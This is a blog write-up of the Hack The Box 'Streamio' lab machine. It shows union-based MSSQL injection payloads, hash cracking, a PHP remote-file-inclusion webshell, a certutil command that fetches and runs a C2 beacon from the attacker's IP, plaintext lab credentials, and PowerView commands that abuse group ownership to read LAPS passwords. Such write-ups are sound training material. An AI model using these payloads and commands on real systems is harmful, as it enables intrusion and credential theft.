---
layout: post
title: HTB Streamio writeup
lang: en
categories: [Offensive, HTB]
tags: [windows, active-directory, sqli, rfi, php, laps]
permalink: /posts/2024-09-20-streamio-htb-writeup
---

![streamio-thumb.webp]({{ site.baseurl }}/images/streamio-thumb.webp)

## Intro

Hi fellow hackers! In this HTB medium box, we are going to exploit SQL injection, PHP remote file inclusion and do a bunch of pivoting betweeen users with the help of bloodhound and some browser creds. I am going to be using sliver C2 to execute commands and manage beacons from different users.


## Enumeration 
```
Nmap scan report for streamio (10.129.202.132)
Host is up (0.064s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-07 22:34:11Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2024-09-07T22:35:44+00:00; +7h00m00s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Issuer: commonName=streamIO/countryName=EU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-02-22T07:03:28
| Not valid after:  2022-03-24T07:03:28
| MD5:   b99a:2c8d:a0b8:b10a:eefa:be20:4abd:ecaf
|_SHA-1: 6c6a:3f5c:7536:61d5:2da6:0e66:75c0:56ce:56e4:656d
|_http-title: Not Found
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
![951d3490cad0ffaf135add5f807e6b7d.png]({{ site.baseurl }}/images/951d3490cad0ffaf135add5f8|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49680/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
49736/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-09-07T22:35:05
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```

#### streamio.htb directory bruteforce
![951d3490cad0ffaf135add5f807e6b7d.png]({{ site.baseurl }}/images/951d3490cad0ffaf135add5f807e6b7d.png)

![677032fa520f5c178bafd632cea2c55f.png]({{ site.baseurl }}/images/677032fa520f5c178bafd632cea2c55f.png)

*master.php seems interesting, but we can't do anything with it right now, so we'll leave it for later.*
![a80bb040ecf94257ea30da5c897af455.png]({{ site.baseurl }}/images/a80bb040ecf94257ea30da5c897af455.png)

#### watch.streamio.htb file bruteforce
![89cf16b81422939a96ad2098cf841cbe.png]({{ site.baseurl }}/images/89cf16b81422939a96ad2098cf841cbe.png)

***

## SQLi

Using directory bruteforcing we have found a file called [search.php](https://watch.streamio.htb/search.php) 

It contains a search bar that allows for searching films

![d702f0dbcf3428e170d03bc5e9ba675c.png]({{ site.baseurl }}/images/d702f0dbcf3428e170d03bc5e9ba675c.png)

We can see that `a' AND 1=1 --` and `a' AND 1=2 --` yield different results, this is and indicator that a SQLi vulnerability may exist.

![c4465ebccbc01046b3e6054db88d10d3.png]({{ site.baseurl }}/images/c4465ebccbc01046b3e6054db88d10d3.png)

We discover a union select sql injection 

**From here on all payloads are URL encocded**

![91f40d1c2dccf0816da06054dd9eedec.png]({{ site.baseurl }}/images/91f40d1c2dccf0816da06054dd9eedec.png)

![c2a3935064dc76accc5cf8c823aea851.png]({{ site.baseurl }}/images/c2a3935064dc76accc5cf8c823aea851.png)

### Extracting data from MSSQL

Using the following payload we find the database's name that we are interacting with `10'+union+select+1,db_name(),2,3,4,5 --`  *STREAMIO*

We can then have a look at what tables are availiable to us, maybe we can find some creds.

![91106285856976352b502f0b839dab77.png]({{ site.baseurl }}/images/91106285856976352b502f0b839dab77.png)
*` 10' union select 1,table_name,2,3,4,5 FROM information_schema.tables -- `*

*[contents of information_schema.tables](https://www.mssqltips.com/sqlservertutorial/196/information-schema-tables/)*

We are then able to select from the users table, however we do not know what columns it has. We can try to guess, but the [portswigger SQLi cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) has another useful command for us to run.

`SELECT * FROM information_schema.columns WHERE table_name = 'users'`
*However since we have a union select vulnerability we can't just plainly select, so we are going to use the same trick as we used in the previous query*

![287a1b81c60310670df037a1d501f186.png]({{ site.baseurl }}/images/287a1b81c60310670df037a1d501f186.png)
We have now acquired the column names, now in order to extract them, we will have to use string concatenation. We can see that since the number 2 also prints with the query, *(Marked by green arrows)* then maybe we could use the second column. However when we try to replace "2" with a string the query fails to return, which means the second columns data type in the original query is not a string.

![fe275dcbc2b5e976537aeb75a005c567.png]({{ site.baseurl }}/images/fe275dcbc2b5e976537aeb75a005c567.png)

*The syntax for string concatenation in the portswigger cheatsheet did not work for me, so I used the MSSQL concat function* `10'+union+select+1,CONCAT(username,+'%3a',+password),2,3,4,5+FROM+users+--`

![32231b5a929b7580a88191312c884169.png]({{ site.baseurl }}/images/32231b5a929b7580a88191312c884169.png)

We got a bunch of passwords and hashes so I'm gonna download the response and grep them out

![7f4ee8ad8cb51848ab315a4bad542c09.png]({{ site.baseurl }}/images/7f4ee8ad8cb51848ab315a4bad542c09.png)

We can tell that it looks like md5 hashes, but if in doubt, use *hashid* from kali.

Now we crack them using hashcat  `hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --username -o db_hashes_recovered.txt`

![592aeee1a72f02cb12b5a9549af4f4ae.png]({{ site.baseurl }}/images/592aeee1a72f02cb12b5a9549af4f4ae.png)

I then retrieved only the login and password using awk to test these credentials against `streamio.htb/login.php`

`awk -F ":" '{print $1 ":" $3}' user_pass.txt`

We can use hydra to see if we can get a valid login 

![64d434c8ddd0c9504bc51f316909db44.png]({{ site.baseurl }}/images/64d434c8ddd0c9504bc51f316909db44.png)

***

## Exploiting the admin panel

When we login to streamio.htb, we are now able to access the /admin endpoint previously unavailiable to us.

Let's try bruteforcing directories

We can see that the url parameter seems to indicate pages, since it changes whenever we click on a different section.

![78a8ea1dfb22cd16f09c268e2c3dbf3c.png]({{ site.baseurl }}/images/78a8ea1dfb22cd16f09c268e2c3dbf3c.png)

We can try to fuzz this parameter to find other pages that are not listed 

![112166403e09e9efa18269f9e0b2f93c.png]({{ site.baseurl }}/images/112166403e09e9efa18269f9e0b2f93c.png)

Something that we haven't seen is the page debug, let's have a look at that.

If we pass in master.php that we found earlier in the enumeration phase, we can see a page that was previously unavailiable to us, since it could only be included. It seems to print the contents of all other tabs.

![3d513b30a4ac2ad0511e673f5642dcbb.png]({{ site.baseurl }}/images/3d513b30a4ac2ad0511e673f5642dcbb.png)

If we open the page as raw html, we can see an interesting form at the bottom, that is not displayed as a tab:

![31a37e96866effbf048abf873c03f74f.png]({{ site.baseurl }}/images/31a37e96866effbf048abf873c03f74f.png)

That means, if we make a post request to the same endpoint with the parameter include, we might be able to include arbitrary files, and if remote file inclusion is availiable, we may be able to include a PHP web shell.

![0608b28006f586db588837cd5895125b.png]({{ site.baseurl }}/images/0608b28006f586db588837cd5895125b.png)
![829bbb9785f40eca1e0236d9a92a997d.png]({{ site.baseurl }}/images/829bbb9785f40eca1e0236d9a92a997d.png)

Lo and behold, the server includes remote files. Let's pop a webshell shall we.

## RCE

Webshell content:
```php

    if(isset($_POST['cmd']))
    {
        system($_POST['cmd']);
    }

```

Since the shell is not really being uploaded, but included in the code, we will have to include the webshell with every command. 

![e092817e578e7cae56283fb65f8c4794.png]({{ site.baseurl }}/images/e092817e578e7cae56283fb65f8c4794.png)
*It works!*

Now let's get a sliver beacon going, 

#### *payload*

*In actual red-team engagements, please do not ever just drop a bare sliver c2 shell on the system, you will get flagged by EDR or anything else for that matter immediately*

```cmd

certutil.exe -f -split -urlcache http://10.10.14.117/rs.exe && .\rs.exe

```

![8cfcea2cb8dd744d9e1ece7d6219566c.png]({{ site.baseurl }}/images/8cfcea2cb8dd744d9e1ece7d6219566c.png)

***

## Discovering db_user && db_admin credentials 
found at *C:\inetpub\streamio.htb\admin\index.php* in web source of the admin pages
![5534b13189a2a56bcf7ed9b0d07340fa.png]({{ site.baseurl }}/images/5534b13189a2a56bcf7ed9b0d07340fa.png)

*there are also creds for db_user, but he has less privileges, thus we won't use them*

## Looking at the MSSQL db

![f65d0320b6c921e75ca7a45105780f24.png]({{ site.baseurl }}/images/f65d0320b6c921e75ca7a45105780f24.png)
If we run `netstat -ano` we can see a list of processes on ports, we have a port for MSSQL, so we are going to forward our local machines port to the vulnerable server, to have a look inside.

![5b42455c03d93cdc03030c0711ad5752.png]({{ site.baseurl }}/images/5b42455c03d93cdc03030c0711ad5752.png)

I then found creds for user nikk37, that exists in the windows domain we are attacking
![91983bdab4dc80e03c39b0fce481c6c7.png]({{ site.baseurl }}/images/91983bdab4dc80e03c39b0fce481c6c7.png)

![4f82ed80b48bdff3614f31e0fb3e0519.png]({{ site.baseurl }}/images/4f82ed80b48bdff3614f31e0fb3e0519.png)

Let's crack the hash using hashcat 

```
hashcat -m 0 -a 0 nikk37.hash --username -o nikk37.recovered /usr/share/wordlists/rockyou.txt
```

![f0614a847aebe1027f03d7b5dcd972cf.png]({{ site.baseurl }}/images/f0614a847aebe1027f03d7b5dcd972cf.png)

***

## Privilege escalation

As luck would have it, nikk37 has winrm availiable to him, and so we can login.
![fbf78248592dcb2a4580a4535e4d2d50.png]({{ site.baseurl }}/images/fbf78248592dcb2a4580a4535e4d2d50.png)

## Firefox saved credentials 

When we run winPEAS, we get an interesting message that firefox credentials exist. We can download them and decrypt them locally, see if there's anything interesting in it.

![77a5102d033c64218eb912b99baf2848.png]({{ site.baseurl }}/images/77a5102d033c64218eb912b99baf2848.png)

![21d2cd64bea975481043acbe53f6eb51.png]({{ site.baseurl }}/images/21d2cd64bea975481043acbe53f6eb51.png)

```text
Website:   https://slack.streamio.htb
Username: 'admin'
Password: 'JDg0dd1s@d0p3cr3@t0r'

Website:   https://slack.streamio.htb
Username: 'nikk37'
Password: 'n1kk1sd0p3t00:)'

Website:   https://slack.streamio.htb
Username: 'yoshihide'
Password: 'paddpadd@12'

Website:   https://slack.streamio.htb
Username: 'JDgodd'
Password: 'password@12'

```

We can use these passwords and spray them at different users to see if any of them get us into someone else's session

## Looking at the JDgodd user 

The passwords from before got us a password for 'JDgodd', unfortunately he does not have remote access, so we will have to use runas or powershell credentials to exploit his rights.

![ad1f48f8009acff8600457889810ef04.png]({{ site.baseurl }}/images/ad1f48f8009acff8600457889810ef04.png)
*You can find user's rights, groups e.t.c. through different ways but I just had a look in bloodhound data that I collected earlier*

### Exploiting JDgodd to get Administrator
![7da248e25ec4bac8509c68d1ca737b3f.png]({{ site.baseurl }}/images/7da248e25ec4bac8509c68d1ca737b3f.png)

*Numbers on this list refer to same numbers on scheme*
1. The write owner privilege means that JDgodd can change the owner of the group 'CORE STAFF', if we make the owner a user that we control, we can add users to that group.
2. [ReadLAPSPassword](https://www.thehacker.recipes/ad/movement/dacl/readlapspassword) privilege that CORE STAFF group means that  you can read the LAPS password of the computer account (i.e. the password of the computer's local administrator).  

#### Attack execution

##### Add nikk37 to owners
*I decided to use nikk37 because we have remoting over him, while if we used JDgodd, we would have to jump through hoops, changing owners is loud anyway, whichever user we choose*

*Create credential object for JDgodd*
```powershell
$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force

$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
```

*Add nikk37 to 'CORE STAFF'*
```powershell
#set the owner of CORE STAFF to be JDgodd
Set-DomainObjectOwner -Identity 'CORE STAFF' -OwnerIdentity 'JDgodd' -Credential $Cred

#Give all rights on CORE STAFF to JDgodd (to allow us to write members)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "CORE STAFF" -Rights All -PrincipalIdentity JDgodd

#Add nikk37 to the group core staff
Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'nikk37' -Credential $Cred
```

![df467cd45de263f69c29f1088e2f2669.png]({{ site.baseurl }}/images/df467cd45de263f69c29f1088e2f2669.png)

Once we have done this, *nikk37* can now read the local administrator account's password from LAPS. We can do that with netexec.

![393ba2e805d78518d662b4e1dbe362da.png]({{ site.baseurl }}/images/393ba2e805d78518d662b4e1dbe362da.png)

We receive the Administrator password, and are able to login via winrm. 

![4f6013cca0cd1fb2bab74fded732904f.png]({{ site.baseurl }}/images/4f6013cca0cd1fb2bab74fded732904f.png)

Pwned.

Happy hacking to you my friends!
